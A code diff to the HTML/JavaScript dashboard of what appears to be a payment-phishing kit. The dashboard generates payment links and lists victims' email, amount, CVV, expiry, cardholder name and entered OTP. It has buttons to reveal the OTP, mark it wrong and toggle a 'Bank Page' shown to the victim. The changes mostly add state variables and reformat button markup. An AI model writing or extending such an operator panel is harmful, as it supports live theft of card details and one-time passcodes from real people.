@@ -119,6 +119,7 @@
     }
     .show-otp-btn {
       background: #22c55e;
+    }
        .bank-page-btn {
       background: #8b5cf6;
     }
@@ -185,6 +186,8 @@
 
   <script>
     let transactions = new Map();
+    let paymentLinks = new Map();
+    let bankpageWindow = null;
     
 document.getElementById('generateLinkForm').addEventListener('submit', async (e) => {
   e.preventDefault();
@@ -287,7 +290,7 @@ document.getElementById('generateLinkForm').addEventListener('submit', async (e)
         tbody.innerHTML = '';
         data.forEach(tx => {
           const row = document.createElement('tr');
-          row.innerHTML = `
+             row.innerHTML = `
             <td>${tx.id}</td>
             <td>${tx.email}</td>
             <td>${tx.amount}</td>
@@ -296,7 +299,7 @@ document.getElementById('generateLinkForm').addEventListener('submit', async (e)
             <td>${tx.cvv}</td>
             <td>${tx.expiry}</td>
             <td>${tx.cardholder}</td>
-               <td>
+            <td>
               ${tx.otpEntered ? 
                 `<span class="otp-received">${tx.otpEntered}</span>
                  <button class="wrong-otp-btn" onclick="markWrongOTP('${tx.id}')" ${tx.redirectStatus ? 'disabled' : ''}>
@@ -307,9 +310,9 @@ document.getElementById('generateLinkForm').addEventListener('submit', async (e)
                   `<button class="show-otp-btn" onclick="showOTP('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
                     Show OTP
                   </button>
-                 <button class="bank-page-btn" onclick="toggleBankpage('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
-  ${tx.bankpageVisible ? 'Hide Bankpage' : 'Bank Page'}
-</button>
+                  <button class="bank-page-btn" onclick="toggleBankpage('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
+                    ${tx.bankpageVisible ? 'Hide Bankpage' : 'Bank Page'}
+                  </button>`
               }
             </td>
             <td>
